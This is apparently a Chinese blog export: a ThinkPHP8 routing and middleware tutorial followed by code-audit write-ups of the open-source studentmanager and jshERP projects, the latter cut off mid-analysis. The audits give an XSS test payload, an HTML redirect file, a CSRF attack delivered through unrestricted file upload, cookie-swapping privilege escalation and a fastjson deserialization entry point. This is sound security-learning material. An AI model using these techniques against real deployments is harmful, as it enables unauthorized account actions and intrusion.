如果让指定的参数统一限定为数字，比如id和uid，也就是全局设置，在app.php顶部设置：
Route::pattern([    &quot;id&quot;  =&gt; &quot;\d+&quot;,    &quot;uid&quot; =&gt; &quot;\d+&quot;]);

不喜欢斜杠怎么办？能换成减号吗？可以的：
// 支持替换斜杠Route::rule(&quot;details-:id&quot;, &quot;Index/details&quot;);    // 支持组合变量&lt;id&gt;方式Route::rule(&quot;details-&lt;id&gt;&quot;, &quot;Index/details&quot;);

路由参数.域名.MISS参数
设置路由的时候，可以设置相关方法进行，从而实施匹配检测和行为执行；

ext 方法作用是检测 URL 后缀，比如：我们强制所有 URL 后缀为.html；
Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;ext(&quot;html&quot;);Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;ext(&quot;html|shtml&quot;);

https 方法作用是检测是否为 https 请求，结合 ext 强制 html 如下：
Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;ext(&quot;html&quot;)-&gt;https();

如果想让全局统一配置 URL 后缀的话，可以在 config&#x2F;route.php 中设置；

具体值可以是单个或多个后缀，也可以是空字符串(任意后缀)，false 禁止后缀；
// URL伪静态后缀&quot;url_html_suffix&quot;       =&gt; &quot;html&quot;,

denyExt 方法作用是禁止某些后缀的使用，使用后直接报错；
// 可以将url_html_suffix 设置为空测试Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;denyExt(&quot;jpg|gif|png&quot;);

domain 方法作用是检测当前的域名是否匹配，完整域名和子域名均可；
Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;domain(&quot;localhost&quot;);Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;domain(&quot;new.tp.com&quot;);Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;domain(&quot;new&quot;);

还有ajax&#x2F;pjax&#x2F;json检测、filter 额外参数检测、append追加额外参数、option统一管理检测，可参考手册；
Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;option([    &quot;ext&quot;       =&gt;  &quot;html&quot;,    &quot;https&quot;     =&gt;  false,    &quot;domain&quot;    =&gt;  &quot;www.tp.com&quot;]);

域名
如果想限定的某个域名下生效的路由，比如 news.tp.com 可以通过域名闭包方式：
Route::domain(&quot;news.tp.com&quot;, function () &#123;	Route::rule(&quot;details/:id&quot;, &quot;Index/details&quot;);&#125;);// 或Route::domain(&quot;news&quot;, function () &#123;	Route::rule(&quot;details/:id&quot;, &quot;Index/details&quot;);&#125;);

路由域名也支持：ext、pattern、append 等路由参数方法的操作；


MISS
全局 MISS,类似开启强制路由功能，匹配不到相应规则时自动跳转到 MISS；
Route::miss(&quot;Error/miss&quot;);// 闭包模式Route::miss(function () &#123;    return &quot;MISS 404&quot;;&#125;);

路由分组.URL生成分组
路由分组，即将相同前缀的路由合并分组，这样可以简化路由定义，提高匹配效率；

使用 group()方法，来进行分组路由的注册；
Route::group(&quot;index&quot;, function () &#123;    Route::rule(&quot;:id&quot;, &quot;Index/details&quot;);    Route::rule(&quot;:name&quot;, &quot;Index/hello&quot;);&#125;)-&gt;ext(&quot;html&quot;)-&gt;pattern([&quot;id&quot;=&gt;&quot;\d+&quot;]);// URL1: http://www.tp.com:8000/index/5.html// URL2: http://www.tp.com:8000/index/world.html

也可以省去第一参数，让分组路由更灵活一些；
Route::group(function() &#123;    Route::rule(&quot;test&quot;, &quot;Index/test&quot;);    Route::rule(&quot;h/:name&quot;, &quot;Index/hello&quot;);&#125;)-&gt;ext(&quot;html&quot;);// URL1: http://www.tp.com:8000/test.html// URL2: http://www.tp.com:8000/h/world.html

使用 prefix()方法，可以省略掉分组地址里的控制器；
Route::group(&quot;index&quot;, function () &#123;    Route::rule(&quot;test&quot;, &quot;test&quot;);    Route::rule(&quot;:name&quot;, &quot;hello&quot;);&#125;)-&gt;prefix(&quot;Index/&quot;)-&gt;ext(&quot;html&quot;);// URL1: http://www.tp.com:8000/index/test.html// URL2: http://www.tp.com:8000/index/world.html

URL生成
使用 url() 助手函数来生成定义好的路由地址，放在在控制器使用；
// 静态不带参数的Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;ext(&quot;html&quot;);// 控制器段获取url：/test.htmlreturn url(&quot;Index/test&quot;);// 动态带参数的Route::rule(&quot;details/:id&quot;, &quot;Index/details&quot;)-&gt;ext(&quot;html&quot;);// 控制器段获取url：/details/5.htmlreturn url(&quot;Index/details&quot;, [&quot;id&quot;=&gt;5]);// url参数一和路由的rule的参数二是一致的，可以通过name方法复刻；Route::rule(&quot;details/:id&quot;, &quot;Index/details&quot;)-&gt;name(&quot;de&quot;)-&gt;ext(&quot;html&quot;);// 控制器段获取url：/details/5.htmlreturn url(&quot;de&quot;, [&quot;id&quot;=&gt;5]);// 完整带域名的地址：http://www.tp.com:8000/details/5.htmlreturn url(&quot;de&quot;, [&quot;id&quot;=&gt;5])-&gt;domain(true);return url(&quot;de&quot;, [&quot;id&quot;=&gt;5])-&gt;domain(&quot;www.tp.com&quot;);

在手册 -&gt; 路由 -&gt; URL 生成 有 Route::buildUrl() 源方法，只不过助手函数，更方便；


资源路由创建资源
资源路由，采用固定的常用方法来实现简化 URL 的功能；
Route::resource(&quot;blog&quot;, &quot;Blog&quot;);

系统提供了一个命令，方便开发者快速生成一个资源控制器；
php think make:controller Blog

以上的两部操作，创建了一个控制器Blog类，并生成了增删改查操作的方法，而且还实现了全部路由：



标识
请求类型
路由规则
操作方法



index
GET
blog
index


create
GET
blog&#x2F;create
create


save
POST
blog
save


read
GET
blog&#x2F;:id
read


edit
GET
blog&#x2F;:id&#x2F;edit
edit


update
PUT
blog&#x2F;:id
update


delete
DELETE
blog&#x2F;:id
delete




地址URL
资源路由注册好后，所有地址都是全自动生成，具体如下：
http://www.tp.com:8000/blog				//GET 访问的是index方法，用于显示数据http://www.tp.com:8000/blog/create		//GET 访问的是create方法，新增数据的表单页面http://www.tp.com:8000/blog/5			//GET 访问的是read方法，读取指定id的一条数据http://www.tp.com:8000/blog/5/edit		//GET 访问的是edit方法，读取指定id数据并显示修改表单

http://www.tp.com:8000/blog				//POST 访问的是save方法，用于接收表单提交的新增数据http://www.tp.com:8000/blog/5			//PUT  访问的是update方法，用于接收表单提交的修改数据http://www.tp.com:8000/blog/5			//DELETE 访问的是delete方法，用于接收数据删除信息

默认的参数采用 id 名称，如果你想别的，比如：blog_id；
//相应的 delete($blog_id)...-&gt;vars([&quot;blog&quot;=&gt;&quot;blog_id&quot;]); 

也可以通过 only() 方法限定系统提供的资源方法：
// 只允许指定的这些操作...-&gt;only([&quot;index&quot;,&quot;save&quot;,&quot;create&quot;]);

还可以通过 except() 方法排除系统提供的资源方法：
// only相反操作...-&gt;except([&quot;read&quot;,&quot;delete&quot;,&quot;update&quot;])

使用 rest() 方法，更改系统给予的默认方法，1.请求方式；2.地址；3.操作；
Route::rest(&quot;create&quot;, [&quot;GET&quot;, &quot;/add&quot;, &quot;add&quot;]);// 批量Route::rest([    &quot;save&quot; =&gt; [&quot;POST&quot;, &quot;&quot;, &quot;store&quot;],    &quot;update&quot; =&gt; [&quot;PUT&quot;, &quot;/:id&quot;, &quot;save&quot;],    &quot;delete&quot; =&gt; [&quot;DELETE&quot;, &quot;/:id&quot;, &quot;destory&quot;],]);

支持嵌套资源路由，类似于一对多关联的感觉，实战中用到再操作，详情查看手册：


视图.变量,渲染视图操作
首先，为了方便后续课程学习，先把路由给关闭了；并创建一个用于测试视图的控制器：
// 是否启用路由&quot;with_route&quot;       =&gt; false,// 视图控制器class ViewPage extends BaseController&#123;    public function index()    &#123;        return &quot;view&quot;;    &#125;&#125;

由于我们不用模板引擎，直接使用php原生，就需要使用 engine() 方法，载入 test 模板；
// 载入原生php模板return View::engine(&quot;php&quot;)-&gt;fetch(&quot;test&quot;);// 模板地址为：view/view_page/test.html// 或修改配置文件，将Think改为php就可以使用助手函数return view(&quot;test&quot;);

如果希望模板后缀为 .php，方便 php + html5 混编，在 config&#x2F;view 设置：
// 模板后缀&quot;view_suffix&quot;   =&gt; &quot;php&quot;,

在 fetch() 方法的第二参数，通过数组方式给模板传递变量：
return View::engine(&quot;php&quot;)-&gt;fetch(&quot;test&quot;, [    &quot;name&quot;  =&gt;  &quot;ThinkPHP8&quot;]);// 或 return view(&quot;test&quot;，[    &quot;name&quot;  =&gt;  &quot;ThinkPHP8&quot;]);

表单提交
先载入一个表单页面：
return View::engine(&quot;php&quot;)-&gt;fetch(&quot;input&quot;);

创建一个表单：
&lt;form action=&quot;/view_page/save&quot; method=&quot;post&quot;&gt;    &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/input&gt;	&lt;/form&gt;

接受数据：
public function save()&#123;    return $this-&gt;request-&gt;post(&quot;username&quot;);&#125;

请求对象.变量.信息请求对象
上一节课中表单提交时，我们接受数据使用了 $this-&gt;request-&gt;post() 方法，这哪里来的？

因为我们的控制器继承了 BaseController 追踪进去，可以看到 $request 成员字段；

关于这个知识点的源知识点，可以参考：手册 -&gt; 架构 -&gt; 容器和依赖注入，TP6讲过，8不讲了；

在没有继承 BaseController 时，我们需要自己手动注入请求：
namespace app\controller;use think\Request;class Rely&#123;    protected $request;    // 依赖注入    public function __construct(Request $request)    &#123;        $this-&gt;request = $request;    &#125;    public function index()    &#123;        halt($this-&gt;request-&gt;get());    &#125;&#125;// 上面的请求方式比较原始，过于麻烦，不推荐了

第二种方式：门面Facade，它相关的知识点在手册 -&gt; 架构 -&gt; 门面：
namespace app\controller;use think\facade\Request;class Rely&#123;    public function index()    &#123;        halt(Request::get());    &#125;&#125;

第三种方式：继承 BaseController，其实就是第一种，只不过被封装到基类中去了：
namespace app\controller;use app\BaseController;class Rely extends BaseController&#123;    public function index()    &#123;        halt($this-&gt;request-&gt;get());    &#125;&#125;

第四种方式：终极方法 request()  助手函数：
halt(request()-&gt;get());

请求信息
在手册 请求 -&gt; 请求信息 里有全部的请求方法模块，这里列举几个意思一下：



方法
含义



host
当前访问域名或者IP


port
当前访问的端口


url
当前完整URL


root
URL访问根地址


method
当前请求类型



我们三种方法演示一遍，最终选一种你喜欢的即可：
// 当前urlecho $this-&gt;request-&gt;url();echo Request::url();echo request()-&gt;url();// 请求方法echo request()-&gt;method();// 更多的对照手册自行测试即可

请求变量
Request 对象支持全局变量的检测、获取和安全过滤，支持$_GET、$_POST…等；

使用 has() 方法，可以检测全局变量是否已经设置：
// 判断是否有GET模式下id的值echo request()-&gt;has(&quot;id&quot;, &quot;get&quot;);

更多方法，参看手册 请求 -&gt; 输入变量， 这里意思几个：



方法
描述



param
获取当前请求变量


get
获取 $_GET 变量


post
获取 $_POST 变量


put
获取 PUT 变量


delete
获取 DELETE 变量


session
获取 SESSION 变量



param() 方法是框架推荐的方法，可以自动识别诸如 get、post等数据信息；
// url: http://www.tp.com:8000/rely/index?id=5// 可以获取 get 模式 id 的值echo request()-&gt;param(&quot;id&quot;);echo request()-&gt;get(&quot;id&quot;);// url: http://www.tp.com:8000/rely/index/id/5// 此时，只能是param获取echo request()-&gt;param(&quot;id&quot;);

// 默认值request()-&gt;param(&quot;name&quot;)			// null，实际上页面也转行成空，判断null也成立request()-&gt;param(&quot;name&quot;, &quot;&quot;)		// 空字符串request()-&gt;param(&quot;name&quot;, &quot;无名氏&quot;);	  // 无名氏

可在 app\Request.php 配置过滤器：
http://www.tp.com:8000/rely/index?name=我&lt;b&gt;你&lt;/b&gt;// 将特殊字符转换HTML实体protected $filter = [&quot;htmlspecialchars&quot;];// 如果不想要全局过滤器，可以直接局部request()-&gt;param(&quot;name&quot;, &quot;&quot;, &quot;htmlspecialchars&quot;);// 设置了全局过滤器，但某个不想用request()-&gt;param(&quot;name&quot;, &quot;&quot;, null)// 使用变量修饰符，可以将参数强制转换成指定的类型；// /s(字符串)、/d(整型)、/b(布尔)、/a(数组)、/f(浮点)；request()-&gt;param(&quot;id/d&quot;);

only()、except() 设置允许和排查可接受的变量：
// 允许id和name变量request()-&gt;only([&quot;id&quot;,&quot;name&quot;]);// 默认值设置request()-&gt;only([&quot;id&quot;=&gt;1,&quot;name&quot;=&gt;&quot;默认值&quot;]);// 参数二可设置GET还是POST等request()-&gt;only([&quot;id&quot;,&quot;name&quot;], &quot;GET&quot;);

以上所有，都封装到助手函数 input() 里了：
input(&quot;?get.id&quot;); 		//判断 get 下的 id 是否存在input(&quot;?post.name&quot;); 	//判断 post 下的 name 是否存在input(&quot;param.name&quot;); 	//获取 param 下的 name 值input(&quot;param.name&quot;, &quot;默认值&quot;); 	//默认值input(&quot;param.name&quot;, &quot;&quot;, &quot;htmlspecialchars&quot;); 	//过滤器input(&quot;param.id/d&quot;); 	//设置强制转换

请求类型.输出.重定向请求类型
Request 对象提供了一个方法 method() 来获取当前请求类型，也提供了判断当前的请求类型：



方法
说明



method
获取当前请求类型


isGet
判断是否GET请求


isPost
判断是否POST请求


isPut
判断是否PUT请求


isDelete
判断是否DELETE请求


isAjax
判断是否AJAX请求



使用请求类型伪装，可以提交 PUT、DELETE 类型：
// 载入表单模板public function create()&#123;    return View::engine(&quot;php&quot;)-&gt;fetch(&quot;create&quot;);&#125;// 表单&lt;form action=&quot;/rely&quot; method=&quot;post&quot;&gt;    &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;_method&quot; value=&quot;PUT&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;   // 判断是否PUT请求if (request()-&gt;isPut()) &#123;	echo input(&quot;put.name&quot;);&#125;// 直接ajax、pjax伪装，在url后续添加?_ajax=1即可，结合前段时再研究

响应输出
响应输出，有好几种：包括 return、json() 和 view() 等等；

默认输出方式是以 html 格式输出，如果你发起 json 请求，则输出 json；

而背后是 response 对象，可以用 response() 输出达到相同的效果；
$data = &quot;Hello,TP8!&quot;;// 等同于 return $data;return response($data);

response()方法可以设置第二参数，状态码，或调用 code()方法；
// 参数二，发送状态码return response($data, 201);//或return response($data)-&gt;code(201);// json()和view()均支持状态码

重定向
使用 redirect()方法可以实现页面重定向，需要 return 执行；
// 首页return redirect(&quot;/&quot;);// 访问路由页面，外加状态码return redirect(&quot;details/5&quot;, 303);// 访问url生成的地址return redirect(url(&quot;Index/index&quot;));

还支持session跳转和记住上一次地址的跳转，实战时再研究；


中间件定义定义中间件
中间件的主要用于拦截和过滤 HTTP 请求，并进行相应处理；

这些请求的功能可以是 URL 重定向、权限验证等等；

为了进一步了解中间件的用法，我们首先定义一个基础的中间件；

可以通过命令行模式，在应用目录下生成一个中间件文件和文件夹；
php think make:middleware Check

public function handle($request, \Closure $next)&#123;    // 拦截请求    if ($request-&gt;param(&quot;name&quot;) == &quot;index&quot;)    &#123;        return redirect(&quot;../../../../&quot;);    &#125;    // 继续往执行    return $next($request);&#125;

然后将这个中间件进行注册，在应用目录下的middleware.php文件中配置；
// 注册中间件app\middleware\Check::class

中间件的入口执行方法必须是：handle()方法，第一参数请求，第二参数是闭包；

业务代码判断请求的 name 如果等于 index，就拦截住，执行中间件，跳转到首页；

但如果请求的 name 是 lee，那需要继续往下执行才行，不能被拦死；

那么就需要$next($request)把这个请求去调用回调函数；

中间件 handle()方法规定需要返回 response 对象，才能正常使用；

而$next($request)执行后，就是返回的 response 对象；

为了测试拦截后，无法继续执行，可以 return response()助手函数测试；


前后置中间件
将$next($request)放在方法底部的方式，属于前置中间件；

前置中间件就是请求阶段来进行拦截验证，比如登录判断、跳转、权限等；

而后置中间件就是请求完毕之后再进行验证，比如写入日志等等；
public function handle($request, \Closure $next)&#123;    //中间件代码，前置    return $next($request);&#125;

public function handle($request, \Closure $next)&#123;    $response = $next($request);    //中间件代码，后置    return $response;&#125;

// 先执行内容，再执行中间件$response = $next($request);// 拦截请求if ($request-&gt;param(&quot;name&quot;) == &quot;index&quot;)&#123;    return redirect(&quot;../../../../&quot;);&#125;return $response;

中间件操作路由中间件
创建一个给路由使用的中间件，判断路由的 ID 值实现相应的验证；
php think make:middleware Auth

路由方法提供了一个 middleware() 方法，让指定的路由采用指定的中间件；
// 限定这个路由采用了中间件Route::rule(&#x27;/&#x27;, &#x27;Index/index&#x27;)-&gt;middleware(\app\middleware\Auth::class);

// 导入后，可以省略use app\middleware\Auth;use app\middleware\Check;// 路由采用多个中间件Route::rule(&#x27;/&#x27;, &#x27;Index/index&#x27;)-&gt;middleware([Auth::class, Check::class]);

也可以在 config&#x2F;middleware.php 配置文件加中，配置别名支持；
// 别名或分组&#x27;alias&#x27;    =&gt; [    &quot;Auth&quot;  =&gt; \app\middleware\Auth::class,    &quot;Check&quot; =&gt; \app\middleware\Check::class,],

// 当然，Route::group() 路由分组也支持Route::rule(&#x27;/&#x27;, &#x27;Index/index&#x27;)-&gt;middleware([&quot;Auth&quot;, &quot;Check&quot;]);

2. 控制器中间件
如果不用路由，怎么用局部化的中间件呢？当然也可以直接在控制器上定义；
// 这里是别名方式，和路由一样，另外两种均支持protected $middleware = [&quot;Auth&quot;, &quot;Check&quot;];

默认是控制器全体方法有效，如果需要限制，还是 only 和 except；
protected $middleware = [    &quot;Auth&quot;  =&gt;  [&quot;only&quot; =&gt;  [&quot;hello&quot;]],    &quot;Check&quot; =&gt;  [&quot;only&quot; =&gt;  [&quot;index&quot;]]];

]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计-studentmanager</title>
    <url>/2025/06/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-studentmanager/</url>
    <content><![CDATA[前言这次是笔者第一次自己未借鉴任何文章审一个独立项目
这次所审的项目比较老，但非常适合像我一样的java审计新手来进行尝试，下面我会仔细写上鄙人这次的审计思路和方法
本次我用的是半黑盒＋半白盒的审计方法
环境搭建项目地址：https://github.com/ZeroWdd/studentmanager

jdk 1.8
mysql 5.5
tomcat 7

我是用navicat来搭建数据库，字符集选择的是utf8，排序规则选择的是utf8_bin
新建完数据库后将项目中的sql.sql文件导入进去
然后在application.yml文件中将相关信息输入进去

做完这些之后就可以通过StudentmanagerApplication.java启动项目了，默认端口是8080
审计sql注入一拿到这个项目的时候，第一件事情就是看pom.xml文件，看有哪些可以利用的依赖以及版本，看用的数据库是哪一种
这里是用mybatis，因此我们就先从审是否存在sql漏洞开始
而mybatis的未做预处理的话所用的危险字符便是$&#123;，所以我们全局搜索一下，跟sql相关的xml文件中什么都没有，点进去后发现每一个sql语句都进行了预处理，是利用#&#123;&#125;进行处理的

所以根本不存在sql漏洞。。。。
审拦截器这次是一个springmvc项目，所以我的下一步就是审计interceptors文件夹下面的文件，看是否存在一些可以越权，绕过登录的地方
这次该文件夹下面只有一个文件LoginInterceptor.java，具体代码如下：
public class LoginInterceptor implements HandlerInterceptor &#123;    @Override    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws IOException &#123;        Admin user = (Admin)request.getSession().getAttribute(Const.ADMIN);        Teacher teacher = (Teacher)request.getSession().getAttribute(Const.TEACHER);        Student student = (Student)request.getSession().getAttribute(Const.STUDENT);        if(!StringUtils.isEmpty(user) || !StringUtils.isEmpty(teacher) || !StringUtils.isEmpty(student))&#123;            return true;        &#125;        response.sendRedirect(request.getContextPath() + &quot;/system/login&quot;);        return false;    &#125;&#125;

该函数的作用主要就是进行一个登录检测，看session中是否已经有相关数据，没有的话就强制返回登录界面
查看该文件在哪里用上-SpringmvcConfig.java
public void addInterceptors(InterceptorRegistry registry) &#123;    registry.addInterceptor(new LoginInterceptor()).addPathPatterns(&quot;/**&quot;).excludePathPatterns(&quot;/&quot;,&quot;/system/login&quot;,&quot;/system/checkCode&quot;,&quot;/easyui/**&quot;,&quot;/h-ui/**&quot;,&quot;/upload/**&quot;);&#125;

该函数的主要作用就是拦截除了对excludePathPatterns内的路径外的所有请求进行检验
由于鄙人对拦截器何时开始作用还不是很熟悉，想着既然对/upload目录下的所有路径请求都不会进行检测，那么我通过/upload/../任意路由是不是就可以进行一个成功的绕过，结果当然是失败的，后面问了下ai才明白在Spring MVC中，拦截器路径匹配会先进行规范化处理，会自动将包含 ..的路径解析为标准绝对路径，所以上面会被解析为/任意路由后再经过拦截器的路径匹配
那到目前为止这是绕不过去的了，无懈可击，我们先放一旁
纯粹的xssok，现在先转移视线，去测测每个功能点，主要先从比较可能存在漏洞的点开始，比如文件上传，修改信息等等
我先随便登了个学生账号开始测功能点，找了个可以修改学生信息的点

看到输入框就手痒痒，测一手看是否存在xss，除了姓名框外剩下的都有严格的限制，所以对姓名尝试一手：&lt;script&gt;alert(1)&lt;/script&gt;，点击提交，立即弹出警告框

可惜的是查看表的时候发现该条限制了输入字符数，就32个，基本造成不了危害了

去试验了其他地方点，比如老师的课程管理中的修改课程课程信息的功能点，其中的课程名称也可以实现xss，但是也限制了字符数，无法造成危害，除了弹窗

任意文件上传通杀存储型xss回到修改学生信息的那个功能点，我们发现下面有一个上传图片的功能，抓个包，路由是/student/editStudent，找到相关的代码，位于src&#x2F;main&#x2F;java&#x2F;com&#x2F;wdd&#x2F;studentmanager&#x2F;controller&#x2F;StudentController.java中
在看完editStudent方法后，很简单地就发现对上传的文件没有进行任何的检验，上传任意后缀的文件都是可以的，但是会对上传的文件名进行随机化处理，但没有影响
可以上传任意的文件，但是在之前审pom.xml文件的时候我们就知道了这是一个纯粹的springmvc系统，对jsp后缀的文件不会进行任何的处理，所以传不了木马了
但是除了这个外，我们还可以做很多其他的事情，这里我就上传了一个html文件，要验证能够造成危害的话那这里我就是测试能否进行重定向，内容如下：
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;    &lt;p&gt;111111111&lt;/p&gt;&lt;/body&gt;&lt;script&gt;window.location.href = &quot;https://www.baidu.com&quot;;&lt;/script&gt;&lt;/html&gt;

上传成功，但直接访问的话却加载失败了，以为又失败了，问了学长后才明白这是因为springmvc本身的特性，那些静态资源都是在编译的时候加载完的，所以只要我们重启一下项目之后再访问便可以
完整的url很容易通过burpsuite获取到

继续访问成功重定向到百度

收获一个通杀存储型xss
csrf以为对于任意文件上传的利用就到此为止了吗，不不不
由于上面实现了xss，自然而然地就想到了能否实现csrf
于是登录了一个教师账号，而在教师的页面中会自动加载学生列表，点击修改的话会自动加载学生的相片
找了一个添加学生的功能点，路由是&#x2F;student&#x2F;addStudent，并且审其相关功能的代码的时候发现也没有对csrf进行一个防御

于是我们抓下添加学生的数据包，生成csrf poc

 复制完html代码后自己创一个html文件扔进去，然后在任意一个学生账号里面修改信息，将该html文件上传上去
接着我们退出学生账号，登录回教师账号，选中我们自己上面改了的那个学生条目点击修改，打开图片

页面如下所示

这说明我们已经成功执行了csrf，重新刷新一下页面，就会发现学生列表界面多了一个人出来

不止是添加学生的功能，经过测试之后删除功能也是可以的，剩下的其他功能就没有继续去测试了，但应该都是可以实现csrf的
同样不仅仅只是教师和学生之间能实现csrf，在管理员和教师之间也可以实现csrf，同样的比如是添加教师功能等等，在这里就不一一列举出来了
收获csrf漏洞

可能会有人疑惑为什么需要打开图片才会实现操作，这是因为在修改页面我们上传的图片是以img标签的形式存在的

而这样子的话就相当于只是引用了该url，并没有对解析其中的js等，自然就无法直接触发漏洞

垂直越权可是上面的危害都不是很大，就在差不多要心灰意冷的时候，我发现了不同的方法之间有的验证了用户的身份但是有的没有
就比如在StudentController.java中的getStudentList方法

在该方法中有通过session来验证用户是老师还是学生并显示相对应的内容
但是在添加学生这个方法中
@RequestMapping(&quot;/addStudent&quot;)@ResponseBodypublic AjaxResult addStudent(@RequestParam(&quot;file&quot;) MultipartFile[] files,Student student) throws IOException &#123;    AjaxResult ajaxResult = new AjaxResult();    student.setSn(SnGenerateUtil.generateSn(student.getClazzId()));    // 存放上传图片的文件夹    File fileDir = UploadUtil.getImgDirFile();    for(MultipartFile fileImg : files)&#123;        // 拿到文件名        String extName = fileImg.getOriginalFilename().substring(fileImg.getOriginalFilename().lastIndexOf(&quot;.&quot;));        String uuidName = UUID.randomUUID().toString();        try &#123;            // 构建真实的文件路径            File newFile = new File(fileDir.getAbsolutePath() + File.separator +uuidName+ extName);            // 上传图片到 -》 “绝对路径”            fileImg.transferTo(newFile);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;        student.setPhoto(uuidName+extName);    &#125;    //保存学生信息到数据库    try&#123;        int count = studentService.addStudent(student);        if(count &gt; 0)&#123;            ajaxResult.setSuccess(true);            ajaxResult.setMessage(&quot;保存成功&quot;);        &#125;else&#123;            ajaxResult.setSuccess(false);            ajaxResult.setMessage(&quot;保存失败&quot;);        &#125;    &#125;catch (Exception e)&#123;        e.printStackTrace();        ajaxResult.setSuccess(false);        ajaxResult.setMessage(&quot;保存失败&quot;);    &#125;    ajaxResult.setSuccess(true);    return ajaxResult;&#125;

我们可以发现全程中没有对用户的身份进行验证，那不就代表这里可能存在越权了吗
于是我们将添加学生的请求进行拦截，将cookie换成任意一个学生账号的

成功添加，刷新一下老师的学生列表页面

由于上面都是围绕添加学生这个功能点进行讲解，所以这里就再加一个功能点进行测试，经过一定的审计后选的是审核请假条的功能点

选中审核，点击提交，进行拦截

发送到重放器，修改cookie值，发送，却直接302跳转到了登录界面

咦，这是怎么回事，一开始我以为问题出在审批的sql语句中有需要教师身份的地方，但由于我们是学生身份所以sql语句执行不成功
在LeaveController.java的checkLeave方法中一直跟到底层的sql语句处
&lt;update id=&quot;checkLeave&quot; parameterType=&quot;Leave&quot;&gt;    update s_leave set student_id = #&#123;studentId&#125;,info = #&#123;info&#125;,status = #&#123;status&#125;,remark = #&#123;remark&#125; where id = #&#123;id&#125;&lt;/update&gt;

可以发现并不是像我想的那样，那应该就是cookie过期了，位于SystemController.java中的logout方法的代码证明了我的猜想

一旦我登出之后cookie便过期了，也就是说在我们进行越权的过程中，学生账号不能退出
重新登录了一个学生账号，再次修改cookie，响应“审批成功”

经过测试，除了几个特定的方法之外，剩下的学生与老师间，老师与管理员间都是可以进行垂直越权的
总结总而言之，该项目的审计难度不大，项目结构比较简单清晰，代码逻辑也比较容易理解，并没有封装很多层，所以关键就在于审计的思路
希望我的审计思路能够对读者们有一定的帮助
这个项目的审计到这里就结束了，笔者一共就只挖出了上面几个漏洞，如果还有人挖出了更多的欢迎和笔者进行交流
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
  </entry>
  <entry>
    <title>代码审计-jshERP v2.3</title>
    <url>/2025/05/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-jshERP-v2-3/</url>
    <content><![CDATA[参考深入学习Java代码审计技巧—详细剖析某erp漏洞-先知社区
环境搭建https://github.com/jishenghua/jshERP/releases/tag/2.3
java版本为1.8
创建完数据库之后，在application.properties文件中修改相关的数据库数据

然后就可以启动了

下面为一位师傅的审计思路，个人觉得是非常的有道理

对于Java代码审计，主要的审计步骤如下：

确定项目技术框架、项目结构
环境搭建
配置文件的分析：如pom.xml、web.xml等，特别是pom.xml，可以从组件中寻找漏洞
Filter分析：Filter是重要的组成部分，提前分析有利于把握项目对请求的过滤，在后续漏洞利用时能够综合分析
路由分析：部分项目请求路径与对用的controller方法不对应，提前通过抓包调试分析，了解前端请求到后端方法的对应关系，便于在后续分析中更快定位代码
漏洞探测
探测之前可借用工具辅助分析，如codeql、fortify、Yakit、BP等
SQL注入分析、RCE分析可先从代码入手，通过关键API及特征关键字来进行逆向数据流分析，从sink到source，判断参数是否可控
XSS、文件上传等漏洞适合正向数据流分析，由于存储型XSS数据流断裂，从代码层面不好将两条数据流联系起来，可以通过前端界面的测试，找到插入口和显示处性质一样的点，在通过后端代码分析，构造出可利用的payload
逻辑漏洞这类也是从前端入手比较好处理，后端代码庞大难以定位




配置文件审计首先我们先看一眼pom.xml，看看有没有什么漏洞

fastjson版本为1.2.55，存在漏洞
于是乎，我们全局搜索一下parseObject方法
猜测search可能可控，进入分析

查看getInfo函数的调用处，比较多，一个一个筛选，这里选择UserComponent.java中的getUserList方法进行分析
private List&lt;?&gt; getUserList(Map&lt;String, String&gt; map)throws Exception &#123;      String search = map.get(Constants.SEARCH);      // 这里      String userName = StringUtil.getInfo(search, &quot;userName&quot;);      String loginName = StringUtil.getInfo(search, &quot;loginName&quot;);      String order = QueryUtils.order(map);      String filter = QueryUtils.filter(map);      return userService.select(userName, loginName, QueryUtils.offset(map), QueryUtils.rows(map));  &#125;

逐层向上调用分析，可以得知在ResourceController.java中调用select，即search参数可控
@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)  public String getList(@PathVariable(&quot;apiName&quot;) String apiName,                        @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize,                        @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage,                        @RequestParam(value = Constants.SEARCH, required = false) String search,                        HttpServletRequest request)throws Exception &#123;      Map&lt;String, String&gt; parameterMap = ParamUtils.requestToMap(request);      parameterMap.put(Constants.SEARCH, search);      PageQueryInfo queryInfo = new PageQueryInfo();      Map&lt;String, Object&gt; objectMap = new HashMap&lt;String, Object&gt;();      if (pageSize != null &amp;&amp; pageSize &lt;= 0) &#123;          pageSize = 10;      &#125;      String offset = ParamUtils.getPageOffset(currentPage, pageSize);      if (StringUtil.isNotEmpty(offset)) &#123;          parameterMap.put(Constants.OFFSET, offset);      &#125;      // 这里      List&lt;?&gt; list = configResourceManager.select(apiName, parameterMap);      objectMap.put(&quot;page&quot;, queryInfo);      if (list == null) &#123;          queryInfo.setRows(new ArrayList&lt;Object&gt;());          queryInfo.setTotal(BusinessConstants.DEFAULT_LIST_NULL_NUMBER);          return returnJson(objectMap, &quot;查找不到数据&quot;, ErpInfo.OK.code);      &#125;      queryInfo.setRows(list);      